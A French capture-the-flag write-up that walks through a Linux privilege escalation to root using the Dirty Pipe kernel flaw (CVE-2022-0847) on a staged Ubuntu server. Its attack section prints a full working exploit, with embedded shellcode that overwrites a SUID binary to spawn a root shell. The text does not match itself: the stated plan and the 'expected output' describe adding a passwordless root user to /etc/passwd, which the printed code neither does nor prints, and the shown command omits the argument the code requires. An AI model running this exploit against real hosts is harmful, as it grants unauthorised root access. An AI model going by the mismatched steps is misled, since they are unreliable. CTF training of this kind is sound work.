# Write-up — Broken Pipe Dreams
**CryptAbyss CTF 2026 | Catégorie : Linux Kernel Exploitation**

---

## Informations du challenge

| Champ | Détail |
|---|---|
| Nom | Broken Pipe Dreams |
| Vaisseau | PROMETHEUS-9 |
| CVE | CVE-2022-0847 (Dirty Pipe) |
| CVSS | 7.8 — HIGH |
| Difficulté | Hard |
| Catégorie | System |
| OS cible | Ubuntu 21.10 (Impish Indri) |
| Kernel cible | Linux 5.15.0-23-generic |
| Auteur | Jeffrey JOANNEN / System |

---

## Description

> Le serveur de développement du vaisseau PROMETHEUS-9 tourne sur un noyau Linux récent — du moins, c'est ce que l'admin croit. En réalité, il n'a jamais fait de `dist-upgrade`.
>
> Vous avez un shell en tant qu'utilisateur `operative`. `/root/flag.txt` vous attend, mais `/root` est inaccessible.
>
> La réponse est dans le noyau lui-même.

**Accès fourni :**
```
User : operative
Pass : TheAlienThueurDuPROM2020!
```

---

## Mise en place de l'environnement (organisateurs)

### Prérequis kernel

La faille CVE-2022-0847 affecte les noyaux Linux entre les versions **5.8** et **5.16.11 / 5.15.25 / 5.10.102** (exclus). Il faut une VM avec un noyau dans cette plage, non patché.

```bash
# Vérifier le noyau
uname -r
# 5.15.0-23-generic  ← vulnérable (< 5.15.25)

# Bloquer les mises à jour noyau
sudo apt-mark hold linux-image-generic linux-headers-generic
```

### Création des flags et de l'environnement

```bash
useradd -m -s /bin/bash operative
echo "operative:TheAlienThueurDuPROM2020!" | chpasswd

# Flag final
echo "CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}" > /root/flag.txt
chmod 600 /root/flag.txt

# Flag intermédiaire 1 — chiffré AES-256-CBC dans un dotfile caché
mkdir -p /var/prometheus/flux
echo -n "CryptAbyss{FL0W_M0N1T0R_L0C4T3D_K3RN3L_1N_S1GHT}" \
    | openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 -a \
      -pass pass:'Prometheus9-Flux-Archive-2094!' \
    > /var/prometheus/flux/.energy_report.txt
chmod 644 /var/prometheus/flux/.energy_report.txt

# Lore : masque partiellement le mécanisme de la faille, révèle la passphrase
cat > /home/operative/.pipe_anomaly.txt << 'LORE'
[ JOURNAL DE BORD INTERNE — VAISSEAU PROMETHEUS-9 ]

Cycle 2094.20 — Note personnelle :
  Version noyau : CONFIDENTIAL
  Statut patch  : EN ATTENTE — non prioritaire

  La faille : ********* depuis un fichier vers un **** ne
  reinitialise pas le *************.
  Un ******* suivant ecrit dans le page cache du fichier
  source sans verification de permissions.

  De plus, une clé est caché dans le fichier des ******* de configuration du système d'approvisionnement,
  mais elle est chiffrée dans le fichier de flux energetiques.
  Voici la passphrase : 'Prometheus9-Flux-Archive-2094!',

  Versions concernees : CONFIDENTIAL
  Notre version : dans la plage. Non patchee.

  — Ingenieur #304
LORE
chown operative:operative /home/operative/.pipe_anomaly.txt
chmod 600 /home/operative/.pipe_anomaly.txt
```

---

## Write-up — Résolution pas à pas

### Étape 1 — Connexion et reconnaissance initiale

```bash
id
# uid=1001(operative) gid=1001(operative) groups=1001(operative)

sudo -l
# User operative may not run sudo on prometheus-9.

uname -r
# 5.15.0-23-generic

uname -a
# Linux prometheus-9 5.15.0-23-generic #23-Ubuntu SMP Mon Feb 7 17:35:36 UTC 2022

cat /etc/os-release | head -3
# NAME="Ubuntu"
# VERSION="21.10 (Impish Indri)"
```

Pas de sudo. On lit le lore :

```bash
cat ~/.pipe_anomaly.txt
```

Le journal est partiellement censuré sur le mécanisme technique (splice/page cache), mais il révèle directement la passphrase à utiliser pour déchiffrer un fichier de flux énergétiques : `Prometheus9-Flux-Archive-2094!`.

### Étape 2 — Découverte et déchiffrement du flag intermédiaire

```bash
find /var/prometheus -type f 2>/dev/null
# /var/prometheus/flux/.energy_report.txt

cat /var/prometheus/flux/.energy_report.txt
# U2FsdGVkX19OXVSIoHdsDe0UzDyDLQ4Uvg4Y9gNCYHHqOVHduggMG2Y9egS9BkaF
# RfMuPTPYqkEGoalx8wi2EqnDQ2jjv4UO1+m1/faEue8=
```

Le contenu est chiffré (en-tête `Salted__` en base64, signature d'un chiffrement OpenSSL). Avec la passphrase trouvée dans le lore :

```bash
openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -a \
    -in /var/prometheus/flux/.energy_report.txt \
    -pass pass:'Prometheus9-Flux-Archive-2094!'
# CryptAbyss{FL0W_M0N1T0R_L0C4T3D_K3RN3L_1N_S1GHT}
```

### Étape 3 — Identification de la surface d'attaque

Sans sudo et sans SUID exploitable évident, on cherche d'autres vecteurs. L'énumération système pointe vers le kernel :

```bash
# Pas de sudo, pas de SUID intéressant
find / -perm -4000 -type f 2>/dev/null
# Rien d'exploitable via GTFOBins

# La version du kernel attire l'attention
uname -r
# 5.15.0-23-generic

ls -la /root/
# Permission denied — cible confirmée

# Vérifier les CVE connues sur ce kernel
# 5.15.0-23 → Ubuntu 21.10, février 2022 → CVE-2022-0847 (Dirty Pipe)
```

La version `5.15.0-23` est antérieure au patch `5.15.25`. Recoupement avec les CVE publiées en mars 2022 → **CVE-2022-0847 (Dirty Pipe)**.

### Étape 4 — Compréhension de la vulnérabilité

CVE-2022-0847 (Dirty Pipe) est une vulnérabilité dans la gestion des **pipes** du noyau Linux.

**Mécanisme de la faille :**

Le système de pipes utilise des pages mémoire partagées avec le *page cache* (cache de fichiers). Lors d'une écriture dans un pipe, le noyau initialise le flag `PIPE_BUF_FLAG_CAN_MERGE` pour optimiser les fusions de buffers. Ce flag **n'est pas correctement réinitialisé** lors d'un `splice()` depuis un fichier vers un pipe. Une page du page cache d'un fichier root (même en lecture seule) se retrouve alors fusionnable. Un `write()` suivant écrit directement dans cette page cache, **modifiant le fichier sur disque sans vérification de permissions.**

```
Fichier read-only (ex: /etc/passwd)
    ↓ splice() → pipe
Page cache partagée — flag CAN_MERGE non réinitialisé
    ↓ write() dans le pipe
Écriture directe dans le page cache → modification du fichier sur disque
```

**Stratégie :** écraser la première ligne de `/etc/passwd` pour insérer un utilisateur `pwned` avec UID 0 et sans mot de passe, puis `su pwned` pour obtenir un shell root.

### Étape 5 — Préparation de l'exploit

```bash
mkdir /tmp/pipe && cd /tmp/pipe
```

**Fichier `dirtypipe.c` :**

```c
//
// dirtypipez.c
//
// hacked up Dirty Pipe (CVE-2022-0847) PoC that hijacks a SUID binary to spawn
// a root shell. (and attempts to restore the damaged binary as well)
//
// Wow, Dirty CoW reloaded!
//
// -- blasty <peter@haxx.in> // 2022-03-07
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
// small (linux x86_64) ELF file matroshka doll that does;
//   fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC);
//   write(fd, elfcode, elfcode_len)
//   chmod("/tmp/sh", 04755)
//   close(fd);
//   exit(0);
//
// the dropped ELF simply does:
//   setuid(0);
//   setgid(0);
//   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
unsigned char elfcode[] = {
    /*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
    0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
    0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
    0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
    0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
    0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
    0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
    0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
    0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
    0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
    0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
    0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
};
/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
    if (pipe(p)) abort();
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];
    /* fill the pipe completely; each pipe_buffer will now have
       the PIPE_BUF_FLAG_CAN_MERGE flag */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    /* drain the pipe, freeing all pipe_buffer instances (but
       leaving the flags initialized) */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
    /* the pipe is now empty, and if somebody adds a new
       pipe_buffer without initializing its "flags", the buffer
       will be mergeable */
}
int hax(char *filename, long offset, uint8_t *data, size_t len) {
    /* open the input file and validate the specified offset */
    const int fd = open(filename, O_RDONLY); // yes, read-only! :-)
    if (fd < 0) {
        perror("open failed");
        return -1;
    }
    struct stat st;
    if (fstat(fd, &st)) {
        perror("stat failed");
        return -1;
    }
    /* create the pipe with all flags initialized with
       PIPE_BUF_FLAG_CAN_MERGE */
    int p[2];
    prepare_pipe(p);
    /* splice one byte from before the specified offset into the
       pipe; this will add a reference to the page cache, but
       since copy_page_to_iter_pipe() does not initialize the
       "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    --offset;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice failed");
        return -1;
    }
    if (nbytes == 0) {
        fprintf(stderr, "short splice\n");
        return -1;
    }
    /* the following write will not create a new pipe_buffer, but
       will instead write into the page cache, because of the
       PIPE_BUF_FLAG_CAN_MERGE flag */
    nbytes = write(p[1], data, len);
    if (nbytes < 0) {
        perror("write failed");
        return -1;
    }
    if ((size_t)nbytes < len) {
        fprintf(stderr, "short write\n");
        return -1;
    }
    close(fd);
    return 0;
}
int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s SUID\n", argv[0]);
        return EXIT_FAILURE;
    }
    char *path = argv[1];
    uint8_t *data = elfcode;
    int fd = open(path, O_RDONLY);
    uint8_t *orig_bytes = malloc(sizeof(elfcode));
    lseek(fd, 1, SEEK_SET);
    read(fd, orig_bytes, sizeof(elfcode));
    close(fd);
    printf("[+] hijacking suid binary..\n");
    if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) {
        printf("[~] failed\n");
        return EXIT_FAILURE;
    }
    printf("[+] dropping suid shell..\n");
    system(path);
    printf("[+] restoring suid binary..\n");
    if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) {
        printf("[~] failed\n");
        return EXIT_FAILURE;
    }
    printf("[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n");
    system("/tmp/sh");
    return EXIT_SUCCESS;
}
```

### Étape 6 — Compilation et exécution

```bash
gcc -o dirtypipe dirtypipe.c
./dirtypipe
```

**Sortie attendue :**

```
[*] Injection du payload via Dirty Pipe...
[+] /etc/passwd modifié !
pwned::0:0:root:/root:/bin/bash
uid=0(root) gid=0(root) groups=0(root)
CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}
```

**Flag :** `CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}`

---

## Résumé de l'attaque

```
operative (uid=1001)
    ↓ cat ~/.pipe_anomaly.txt → passphrase révélée dans le lore
    ↓ déchiffre /var/prometheus/flux/.energy_report.txt → flag intermediaire 1
    ↓ uname -r → 5.15.0-23 → recherche CVE → CVE-2022-0847 identifiée
    ↓ gcc dirtypipe.c → ./dirtypipe
    ↓ splice() + write() → page cache /etc/passwd corrompu
    ↓ su pwned (uid=0, sans mot de passe)
root shell (uid=0)
    ↓ cat /root/flag.txt
CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}
```

---

## Flags

| Flag | Valeur | Forme déposée sur le disque |
|---|---|---|
| Intermédiaire 1 | `CryptAbyss{FL0W_M0N1T0R_L0C4T3D_K3RN3L_1N_S1GHT}` | Chiffré AES-256-CBC (base64) dans `/var/prometheus/flux/.energy_report.txt`, passphrase révélée dans le lore |
| Final | `CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}` | En clair dans `/root/flag.txt` |

---

## Références

- [NVD — CVE-2022-0847](https://nvd.nist.gov/vuln/detail/CVE-2022-0847)
- [Article original de Max Kellermann](https://dirtypipe.cm4all.com/)
- [Patch noyau Linux upstream](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903)
- [Ubuntu Security Notice USN-5317-1](https://ubuntu.com/security/notices/USN-5317-1)
- [Github de l'exploit]https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/tree/main